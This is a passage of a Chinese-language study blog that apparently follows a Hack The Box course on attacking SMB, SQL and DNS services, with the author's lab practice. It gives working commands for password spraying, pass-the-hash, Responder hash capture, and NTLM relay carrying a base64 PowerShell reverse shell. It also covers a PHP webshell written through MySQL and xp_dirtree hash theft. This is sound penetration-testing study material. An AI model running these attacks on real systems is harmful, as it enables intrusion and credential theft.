N/A</code></pre><p>Nmap扫描揭示了目标的基本信息： SMB版本（Samba-smbd 4.6.2） 主机名HTB 操作系统是基于SMB实现的Linux</p><h4 id="Anonymous-Authentication"><a href="#Anonymous-Authentication" class="headerlink" title="Anonymous Authentication"></a>Anonymous Authentication</h4><p>如果我们找到一个不需要用户名和密码或找到有效凭据的SMB服务器，我们可以获得共享、用户名、组、权限、策略、服务等的列表。大多数与SMB交互的工具都允许空会话连接，包括smbclient、smbmap、rpcclient或enum4linux。让我们探讨一下如何使用null身份验证与文件共享和RPC进行交互。</p><h4 id="File-Share"><a href="#File-Share" class="headerlink" title="File Share"></a>File Share</h4><p>使用smbclient，我们可以使用选项-L显示服务器的共享列表，使用选项-N，我们告诉smbclient使用null会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbclient -N -L //10.129.14.128        Sharename       Type      Comment        -------      --     -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        notes           Disk      CheckIT        IPC$            IPC       IPC Service (DEVSM)SMB1 disabled no workgroup available</code></pre><p>Smbmap是另一个帮助我们枚举网络共享和访问相关权限的工具。smbmap的一个优点是它为每个共享文件夹提供了一个权限列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                           Disk                                                    Permissions     Comment        --                                                   ---------    -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       IPC Service (DEVSM)        notes                                                   READ, WRITE     CheckIT</code></pre><p>使用带有-r或-r（递归）选项的smbmap，可以浏览目录：</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 -r notes[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                                   Disk                                                    Permissions     Comment        --                                                   ---------    -------        notes                                                   READ, WRITE        .\notes\*        dr--r--r               0 Mon Nov  2 00:57:44 2020    .        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup</code></pre><p>从上面的例子中，权限被设置为READ和WRITE，可以用来上传和下载文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;[+] Starting download: notes\note.txt (116 bytes)[+] File output to: /htb/10.129.14.128-notes_note.txt</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;[+] Starting upload: test.txt (20 bytes)[+] Upload complete.</code></pre><h4 id="Remote-Procedure-Call-RPC"><a href="#Remote-Procedure-Call-RPC" class="headerlink" title="Remote Procedure Call (RPC)"></a>Remote Procedure Call (RPC)</h4><p>我们可以使用带有空会话的rpcclient工具来枚举工作站或域控制器。 rpcclient工具为我们提供了许多不同的命令，用于在SMB服务器上执行特定功能，以收集信息或修改服务器属性（如用户名）。我们可以使用SANS研究所的这份备忘单，也可以查看客户端手册页上所有这些功能的完整列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U&#39;%&#39; 10.10.110.17rpcclient $&gt; enumdomusersuser:[mhope] rid:[0x641]user:[svc-ata] rid:[0xa2b]user:[svc-bexec] rid:[0xa2c]user:[roleary] rid:[0xa36]user:[smorgan] rid:[0xa37]</code></pre><p>Brute Forcing和密码喷雾 当暴力强制时，我们会对一个帐户尝试尽可能多的密码，但如果我们达到阈值，它会锁定一个帐户。我们可以使用暴力，如果我们知道的话，可以在达到阈值之前停止。否则，我们不建议使用暴力。 密码喷洒是一个更好的选择，因为我们可以用一个通用密码锁定用户名列表，以避免帐户锁定。如果我们知道帐户锁定阈值，我们可以尝试多个密码。通常，两到三次尝试是安全的，只要我们在两次尝试之间等待30-60分钟。让我们探索一下<a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> 工具，它包括执行密码喷涂的功能。 使用CrackMapExec（CME），我们可以针对多个IP，使用大量用户和密码。让我们来探索一个密码喷涂的日常使用案例。要对一个IP执行密码喷洒，我们可以使用选项-u指定带有用户列表的文件，使用选项-p指定密码。这将尝试使用提供的密码对列表中的每个用户进行身份验证。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39; --local-authSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE </code></pre><blockquote><p>注意：默认情况下，CME将在成功登录后退出。使用–continue-on-success标志将继续喷洒，即使在找到有效密码后也是如此。它对于向大型用户列表喷洒单个密码非常有用。此外，如果我们的目标是一台未加入域的计算机，我们将需要使用选项–local-auth。有关更详细的研究密码喷洒，请参阅Active Directory枚举和攻击模块。</p></blockquote><h4 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h4><h4 id="Impacket-PsExec"><a href="#Impacket-PsExec" class="headerlink" title="Impacket PsExec"></a>Impacket PsExec</h4><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></pre><h4 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h4><p>我们可以用来运行CMD或PowerShell的另一个工具是CrackMapExec。CrackMapExec的一个优点是可以一次在多个主机上运行命令。要使用它，我们需要指定协议、smb、IP地址或IP地址范围，选项-u表示用户名，-p表示密码，选项-x用于运行cmd命令，大写-x用于运行PowerShell命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexecSMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexecSMB         10.10.110.17 445    WIN7BOX  nt authority\system</code></pre><blockquote><p>注意：如果没有定义–exec方法，CrackMapExec将尝试执行atexec方法，如果失败，您可以尝试指定–exec方式smbexec。</p></blockquote><h4 id="Enumerating-Logged-on-Users"><a href="#Enumerating-Logged-on-Users" class="headerlink" title="Enumerating Logged-on Users"></a>Enumerating Logged-on Users</h4><p>想象一下，我们在一个有多台机器的网络中。其中一些共享相同的本地管理员帐户。在这种情况下，我们可以使用CrackMapExec枚举同一网络中所有机器上的登录用户10.10.110.17&#x2F;24，这加快了我们的枚举过程。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></pre><h4 id="Extract-Hashes-from-SAM-Database"><a href="#Extract-Hashes-from-SAM-Database" class="headerlink" title="Extract Hashes from SAM Database"></a>Extract Hashes from SAM Database</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></pre><h4 id="Pass-the-Hash-PtH"><a href="#Pass-the-Hash-PtH" class="headerlink" title="Pass-the-Hash (PtH)"></a>Pass-the-Hash (PtH)</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></pre><h4 id="Forced-Authentication-Attacks"><a href="#Forced-Authentication-Attacks" class="headerlink" title="Forced Authentication Attacks"></a>Forced Authentication Attacks</h4><p>我们还可以通过创建假SMB服务器来捕获用户的NetNTLM v1&#x2F;v2哈希，从而滥用SMB协议。 执行此类操作的最常见工具是Responder。Responder是一种LLMNR、NBT-NS和MDNS投毒器工具，具有不同的功能，其中之一是可以设置虚假服务，包括SMB，以窃取NetNTLM v1&#x2F;v2哈希。在其默认配置中，它将查找LLMNR和NBT-NS流量。然后，它将代表受害者正在寻找的服务器进行响应，并捕获他们的NetNTLM哈希。 让我们举例说明Responder是如何工作的。想象一下，我们使用响应程序默认配置创建了一个假的SMB服务器，并使用以下命令：</p><pre><code class="shell-session">Tanin@htb[/htb]$ responder -I &lt;interface name&gt;</code></pre><p>假设用户错误地键入了共享文件夹的名称\mysharefoder\，而不是\mysharedfolder\。在这种情况下，所有名称解析都将失败，因为名称不存在，并且机器将向网络上的所有设备发送多播查询，包括我们运行的假冒SMB服务器。这是一个问题，因为没有采取任何措施来验证答复的完整性。攻击者可以通过监听此类查询和欺骗响应来利用这一机制，使受害者相信恶意服务器是可信的。这种信任通常用于窃取凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo responder -I ens33                                         __                 .----.-----.-----.-----.-----.-----.--|  |.-----.----.  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                   |__|                         NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0                 Author: Laurent Gaffie (laurent.gaffie@gmail.com)  To kill this script hit CTRL-C[+] Poisoners:                    LLMNR                      [ON]    NBT-NS                     [ON]            DNS/MDNS                   [ON]                                                                                                                                                                                             [+] Servers:             HTTP server                [ON]                                       HTTPS server               [ON]    WPAD proxy                 [OFF]                                      Auth proxy                 [OFF]    SMB server                 [ON]                                       Kerberos server            [ON]                                       SQL server                 [ON]                                       FTP server                 [ON]                                       IMAP server                [ON]                                       POP3 server                [ON]                                       SMTP server                [ON]                                       DNS server                 [ON]                                       LDAP server                [ON]    RDP server                 [ON]    DCE-RPC server             [ON]    WinRM server               [ON]                                                                                                                      [+] HTTP Options:                                                                      Always serving EXE         [OFF]                                                   Serving EXE                [OFF]                                                   Serving HTML               [OFF]                                                   Upstream Proxy             [OFF]                                               [+] Poisoning Options:                                                                 Analyze Mode               [OFF]                                                   Force WPAD auth            [OFF]                                                   Force Basic Auth           [OFF]                                                   Force LM downgrade         [OFF]                                                   Fingerprint hosts          [OFF]                                               [+] Generic Options:                                                                   Responder NIC              [tun0]                                                  Responder IP               [10.10.14.198]                                          Challenge set              [random]                                                Don&#39;t Respond To Names     [&#39;ISATAP&#39;]                                          [+] Current Session Variables:                                                         Responder Machine Name     [WIN-2TY1Z1CIGXH]       Responder Domain Name      [HF2L.LOCAL]                                            Responder DCE-RPC Port     [48162] [+] Listening for events... [*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local[SMB] NTLMv2-SSP Client   : 10.10.110.17[SMB] NTLMv2-SSP Username : WIN7BOX\demouser[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000</code></pre><p>已破解NTLMv2哈希。密码是P@ssword.如果我们无法破解哈希，我们可以使用impacket ntlmrelayx或Responder MultiRelay.py将捕获的哈希中继到另一台机器。让我们看看使用impacket-ntlmrelay的示例。</p><p>首先，我们需要在响应程序配置文件（&#x2F;etc&#x2F;responser&#x2F;responder.conf）中将SMB设置为OFF。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/responder/Responder.conf | grep &#39;SMB =&#39;SMB = Off</code></pre><p>然后，我们使用选项–no http server、-sb2support执行impacket-ntlmrelayx，并使用选项-t执行目标机器。默认情况下，impacket-ntlmrelayx将转储SAM数据库，但我们可以通过添加选项-c来执行命令。</p><p>我们可以使用创建PowerShell反向shell<a href="https://www.revshells.com/%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%BA%E5%99%A8IP%E5%9C%B0%E5%9D%80%E3%80%81%E7%AB%AF%E5%8F%A3%E5%92%8C%E9%80%89%E9%A1%B9Powershell#3%EF%BC%88Base64%EF%BC%89%E3%80%82">https://www.revshells.com/，设置我们的机器IP地址、端口和选项Powershell#3（Base64）。</a></p><pre><code class="shell-session">Tanin@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>具有读取权限的共享文件夹的名称是什么？</p><p>用户名“jason”的密码是什么？</p><p>通过SSH以用户“jason”身份登录并找到标志.txt文件。提交内容作为您的答案。</p></blockquote><p>使用smbmap：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111559845.png" alt="image-20230811155958797"></p><p>根据给出的用户名爆破一下密码：</p><pre><code>crackmapexec smb 10.129.203.6 -u jason -p passwords.list --local-auth </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111612302.png" alt="image-20230811161236259"></p><p>这里使用ssh链接但是失败了，尝试使用rce</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111624866.png" alt="image-20230811162433821"></p><p>impact没有写权限，无语</p><h1 id="Attacking-SQL-Databases"><a href="#Attacking-SQL-Databases" class="headerlink" title="Attacking SQL Databases"></a>Attacking SQL Databases</h1><p>默认情况下，MSSQL使用端口TCP&#x2F;1433和UDP&#x2F;1434，MySQL使用TCP&#x2F;3306。但是，当MSSQL在“隐藏”模式下运行时，它使用TCP&#x2F;2433端口。我们可以使用Nmap的默认脚本-sC选项来枚举目标系统上的数据库服务</p><h4 id="MySQL-Connecting-to-the-SQL-Server"><a href="#MySQL-Connecting-to-the-SQL-Server" class="headerlink" title="MySQL - Connecting to the SQL Server"></a>MySQL - Connecting to the SQL Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13</code></pre><h4 id="Sqlcmd-Connecting-to-the-SQL-Server"><a href="#Sqlcmd-Connecting-to-the-SQL-Server" class="headerlink" title="Sqlcmd - Connecting to the SQL Server"></a>Sqlcmd - Connecting to the SQL Server</h4><pre><code class="cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></pre><p>注意：当我们使用sqlcmd向MSSQL进行身份验证时，我们可以使用参数-y（SQLCMDMAXVARTYPEWIDTH）和-y（SQLCMDMAXFIXEDTYPEWIDTH）来获得更好的输出。请记住，这可能会影响性能。</p><p>如果我们的目标是来自Linux的MSSQL，我们可以使用sqsh作为sqlcmd的替代方案：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -hsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. GrayPortions Copyright (C) 2004-2014 Michael Peppler and Martin WesdorpThis is free software with ABSOLUTELY NO WARRANTYFor more information type &#39;\warranty&#39;1&gt;</code></pre><p>或者，我们可以使用Impacket中名为mssqlclient.py的工具。</p><pre><code class="shell-session">Tanin@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 </code></pre><h2 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h2><p>在攻击公共服务时，命令执行是最需要的功能之一，因为它允许我们控制操作系统。如果我们有适当的权限，我们可以使用SQL数据库执行系统命令或创建必要的元素来执行。</p><p>MSSQL有一个名为xp_cmdshell的扩展存储过程，它允许我们使用SQL执行系统命令。请记住以下关于xp_cmdshell的内容： xpcmdshell是一个强大的功能，默认情况下是禁用的。xp_cmdshell可以通过使用基于策略的管理或执行sp_configure来启用和禁用 xp_cmdshell派生的Windows进程与SQL Server服务帐户具有相同的安全权限 xp_cmdshell同步运行。在命令shell命令完成之前，控件不会返回给调用方 要在MSSQL上使用SQL语法执行命令，请使用：</p><pre><code class="cmd-session">1&gt; xp_cmdshell &#39;whoami&#39;2&gt; GO</code></pre><p>如果没有启用xp_cmdshell，如果我们有适当的权限，我们可以使用以下命令启用它：</p><pre><code class="mssql">-- To allow advanced options to be changed.  EXECUTE sp_configure &#39;show advanced options&#39;, 1GO-- To update the currently configured value for advanced options.  RECONFIGUREGO  -- To enable the feature.  EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1GO  -- To update the currently configured value for this feature.  RECONFIGUREGO</code></pre><p>MySQL支持用户定义函数，这允许我们在SQL中作为函数执行C&#x2F;C++代码，在这个GitHub存储库 <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>中有一个用于命令执行的用户定义函数。在生产环境中遇到这样的用户定义函数并不常见，但我们应该意识到，我们可能能够使用它</p><h2 id="Write-Local-Files"><a href="#Write-Local-Files" class="headerlink" title="Write Local Files"></a>Write Local Files</h2><p>如果我们有适当的权限，我们可以尝试在web服务器目录中使用SELECT INTO OUTFILE编写文件。然后我们可以浏览到文件所在的位置并执行我们的命令。</p><pre><code class="shell-session">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;;Query OK, 1 row affected (0.001 sec)</code></pre><p>在MySQL中，全局系统变量secure_file_priv限制了数据导入和导出操作的效果，例如由LOAD data和SELECT…INTO OUTFILE语句以及LOAD_file（）函数执行的操作。这些操作只允许具有FILE权限的用户执行。</p><pre><code class="shell-session">mysql&gt; show variables like &quot;secure_file_priv&quot;;+------------------+-------+| Variable_name    | Value |+------------------+-------+| secure_file_priv |       |+------------------+-------+</code></pre><p>如果secure_file_priv变量为空，这意味着我们可以使用MySQL读取和写入数据</p><h4 id="MySQL-Read-Local-Files-in-MySQL"><a href="#MySQL-Read-Local-Files-in-MySQL" class="headerlink" title="MySQL - Read Local Files in MySQL"></a>MySQL - Read Local Files in MySQL</h4><pre><code class="shell-session">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);</code></pre><h2 id="Capture-MSSQL-Service-Hash"><a href="#Capture-MSSQL-Service-Hash" class="headerlink" title="Capture MSSQL Service Hash"></a>Capture MSSQL Service Hash</h2><p>在攻击SMB部分，我们讨论了我们可以创建一个假的SMB服务器来窃取哈希并在Windows操作系统中滥用一些默认实现。我们还可以使用xp_subdirs或xp_dirtree未记录的存储过程窃取MSSQL服务帐户哈希，这些存储过程使用SMB协议从文件系统中检索指定父目录下的子目录列表。当我们使用其中一个存储过程并将其指向SMB服务器时，目录侦听功能将强制服务器进行身份验证并发送运行SQL server的服务帐户的NTLMv2哈希。 为了实现这一点，我们需要首先启动Responder或impacket-smbserver，并执行以下SQL查询之一：</p><h4 id="XP-DIRTREE-Hash-Stealing"><a href="#XP-DIRTREE-Hash-Stealing" class="headerlink" title="XP_DIRTREE Hash Stealing"></a>XP_DIRTREE Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_dirtree &#39;\\10.10.110.17\share\&#39;2&gt; GO</code></pre><h4 id="XP-SUBDIRS-Hash-Stealing"><a href="#XP-SUBDIRS-Hash-Stealing" class="headerlink" title="XP_SUBDIRS Hash Stealing"></a>XP_SUBDIRS Hash Stealing</h4><pre><code class="cmd-session">1&gt; EXEC master..xp_subdirs &#39;\\10.10.110.17\share\&#39;2&gt; GO</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>What is the password for the “mssqlsvc” user?</p></blockquote><p>这里尝试了用给到的字典进行爆破，发现不可行，反复阅读文案后发现可以导出hash：</p><p>先监听</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122043562.png" alt="image-20230812204234008"></p><p>然后执行查询语句弹回hash</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308161515067.png" alt="image-20230812204400386"></p><p>然后破解hash即可</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308122050713.png" alt="image-20230812205036653"></p><h1 id="Attacking-DNS"><a href="#Attacking-DNS" class="headerlink" title="Attacking DNS"></a>Attacking DNS</h1><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><pre><code class="shell-session">Tanin@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDTNmap scan report for 10.10.110.213Host is up (0.017s latency).PORT    STATE  SERVICE     VERSION53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)</code></pre><p>DNS区域是特定组织或管理员管理的DNS命名空间的一部分。由于DNS包括多个DNS区域，DNS服务器利用DNS区域传输将其数据库的一部分复制到另一个DNS服务器。除非DNS服务器配置正确（限制哪些IP可以执行DNS区域传输），否则任何人都可以向DNS服务器索取其区域信息的副本，因为DNS区域传输不需要任何身份验证。此外，DNS服务通常在UDP端口上运行；然而，在执行DNS区域传输时，它使用TCP端口进行可靠的数据传输。 攻击者可以利用此DNS区域传输漏洞来了解有关目标组织的DNS命名空间的更多信息，从而增加攻击面。为了利用此漏洞，我们可以使用带有DNS查询类型AXFR选项的dig实用程序从易受攻击的DNS服务器中转储整个DNS命名空间：</p><pre><code class="shell-session">Tanin@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb; &lt;&lt;&gt;&gt; DiG 9.11.5-P1-1-Debian &lt;&lt;&gt;&gt; axfr inlanefrieght.htb @10.129.110.213;; global options: +cmdinlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800inlanefrieght.htb.         604800  IN      AAAA    ::1inlanefrieght.htb.         604800  IN      NS      localhost.inlanefrieght.htb.         604800  IN      A       10.129.110.22admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25support.inlanefrieght.htb. 604800  IN      A       10.129.110.28inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800;; Query time: 28 msec;; SERVER: 10.129.110.213#53(10.129.110.213);; WHEN: Mon Oct 11 17:20:13 EDT 2020;; XFR size: 8 records (messages 1, bytes 289)</code></pre><p>像 <a href="https://github.com/mschwager/fierce">Fierce</a>这样的工具也可以用来枚举根域的所有DNS服务器，并扫描DNS区域传输：</p><pre><code class="shell-session">Tanin@htb[/htb]# fierce --domain zonetransfer.me</code></pre><h2 id="Domain-Takeovers-amp-Subdomain-Enumeration"><a href="#Domain-Takeovers-amp-Subdomain-Enumeration" class="headerlink" title="Domain Takeovers &amp; Subdomain Enumeration"></a>Domain Takeovers &amp; Subdomain Enumeration</h2><p>在执行子域接管之前，我们应该使用<a href="https://github.com/projectdiscovery/subfinder">Subfinder</a>等工具枚举目标域的子域。这个工具可以从像 <a href="https://dnsdumpster.com/">DNSdumpster</a>这样的开放源代码中抓取子域。<a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>等其他工具也可以通过提供预先生成的单词列表来使用暴力子域：</p><pre><code class="shell-session">Tanin@htb[/htb]# ./subfinder -d inlanefreight.com -v                                                                                      _     __ _         _                                           ____  _| |__ / _(_)_ _  __| |___ _ _          (_-&lt; || | &#39;_ \  _| | &#39; \/ _  / -_) &#39;_|                 /__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                                 projectdiscovery.io                                                                                           [WRN] Use with caution. You are responsible for your actions[WRN] Developers assume no liability and are not responsible for any misuse or damage.[WRN] By using subfinder, you also agree to the terms of the APIs used.                                    [INF] Enumerating subdomains for inlanefreight.com[alienvault] www.inlanefreight.com[dnsdumpster] ns1.inlanefreight.com[dnsdumpster] ns2.inlanefreight.com...snip...[bufferover] Source took 2.193235338s for enumerationns2.inlanefreight.comwww.inlanefreight.comns1.inlanefreight.comsupport.inlanefreight.com[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds</code></pre><p>一个很好的替代方案是一种名为<a href="https://github.com/TheRook/subbrute">Subbrute</a>的工具。该工具允许我们使用自定义解析器，并在无法访问Internet的主机上进行内部渗透测试时执行纯DNS暴力攻击。</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1Tanin@htb[/htb]$ cd subbruteTanin@htb[/htb]$ echo &quot;ns1.inlanefreight.com&quot; &gt; ./resolvers.txtTanin@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt</code></pre><p>有时内部物理配置的安全性很差，我们可以利用它从U盘上传工具。另一种情况是，我们已经通过转向到达了一个内部主机，并希望在那里工作。当然，还有其他选择，但知道其他方式和可能性并没有坏处。 该工具发现了四个与inlanefreight.com相关的子域。使用nslookup或host命令，我们可以枚举这些子域的CNAME记录。</p><pre><code class="shell-session">Tanin@htb[/htb]# host support.inlanefreight.comsupport.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com</code></pre><p>支持子域有一个指向AWS S3存储桶的别名记录。但是，URL<a href="https://support.inlanefreight.com显示了一个nosuchbucket错误,表明子域可能容易受到子域接管的攻击.现在,我们可以通过创建一个具有相同子域名称的aws/">https://support.inlanefreight.com显示了一个NoSuchBucket错误，表明子域可能容易受到子域接管的攻击。现在，我们可以通过创建一个具有相同子域名称的AWS</a> S3 bucket来接管子域。</p><p> <a href="https://github.com/EdOverflow/can-i-take-over-xyz">can-i-take-over-xyz</a>存储库也是子域接管漏洞的绝佳参考。它显示了目标服务是否易受子域接管的攻击，并提供了评估漏洞的指导方针。</p><h4 id="Local-DNS-Cache-Poisoning"><a href="#Local-DNS-Cache-Poisoning" class="headerlink" title="Local DNS Cache Poisoning"></a>Local DNS Cache Poisoning</h4><p>从本地网络的角度来看，攻击者还可以使用 <a 